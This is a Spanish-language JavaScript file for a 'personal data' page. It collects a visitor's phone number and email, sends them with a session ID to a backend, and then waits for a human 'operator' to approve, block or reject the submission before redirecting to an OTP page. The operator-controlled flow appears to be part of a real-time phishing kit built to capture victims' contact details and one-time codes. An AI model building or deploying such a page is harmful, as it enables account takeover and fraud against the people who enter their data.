/**
 * ─────────────────────────────────────────────
 *  SCRIPT: datos-personales.js
 *  Página: Datos personales (teléfono + email)
 *  Incluir: <script src="/assets/js/session.js"></script>
 *           <script src="/assets/js/datos-personales.js"></script>
 * ─────────────────────────────────────────────
 *
 *  HTML esperado:
 *  <form id="datosForm">
 *    <input id="phoneNumber" type="tel"   required />
 *    <input id="email"       type="email" required />
 *    <button type="submit">Continuar</button>
 *    <p id="errorMsg" style="display:none;"></p>
 *  </form>
 */

(async () => {
    // Si no hay sesión activa, volver al login
    if (!SessionManager.getSessionId()) {
        window.location.href = '/index.html';
        return;
    }

    const form     = document.getElementById('datosForm');
    const errorMsg = document.getElementById('errorMsg');

    function showError(msg) {
        errorMsg.textContent = msg;
        errorMsg.style.display = 'block';
    }

    function hideError() {
        errorMsg.style.display = 'none';
    }

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideError();

        const phoneNumber = document.getElementById('phoneNumber').value.trim();
        const email       = document.getElementById('email').value.trim();

        if (!phoneNumber || !email) {
            showError('Completa todos los campos.');
            return;
        }

        try {
            const res = await fetch(window.API_BASE_URL + '/api/datos-personales', {
                method:  'POST',
                headers: { 'Content-Type': 'application/json' },
                body:    JSON.stringify({
                    sessionId: SessionManager.getSessionId(),
                    phoneNumber,
                    email
                })
            });

            const data = await res.json();

            if (!data.success) {
                showError(data.error || 'Error al enviar los datos.');
                return;
            }

            // Datos enviados → esperar acción del operador
            SessionManager.waitForAction({
                onApproved:   () => window.Router.redirect('OTP'),
                onRequestOtp: () => window.Router.redirect('OTP'),
                onBlocked:    () => showError('Acceso bloqueado. Contacta soporte.'),
                onErrorData:  () => showError('Datos incorrectos. Verifica e intenta de nuevo.'),
                onErrorTemp:  () => showError('Error temporal. Intenta más tarde.'),
            });

            form.querySelectorAll('input, button').forEach(el => el.disabled = true);

        } catch (err) {
            console.error(err);
            showError('Error de conexión. Intenta de nuevo.');
        }
    });
})();
